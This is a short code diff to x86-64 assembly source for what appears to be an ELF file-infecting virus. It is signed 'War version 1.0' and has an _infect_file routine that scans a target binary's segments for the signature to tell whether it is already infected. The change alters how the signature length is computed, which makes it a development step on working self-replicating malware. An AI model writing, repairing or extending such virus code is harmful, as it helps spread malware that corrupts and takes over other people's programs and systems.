@@ -33,7 +33,6 @@ _params:; filled for infected binaries
 _start:
 	call _h3ll0w0rld; push addr to stack
 
-len_signature dq 0x34; stop at `lmartin`
 signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
 fingerprint db `00000000:0000`, 0x0
 
@@ -777,7 +776,8 @@ _infect_file: ; (string rdi, stat rsi)
 			jmp .find_segment_exec
 		.check_if_infected:
 			lea rdx, [rel signature]
-			mov rcx, [rel len_signature]
+			lea rcx, [rel fingerprint]
+			sub rcx, rdx
 			mov rdi, [rbx + P_OFFSET]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + P_FILESZ]; p_filesz
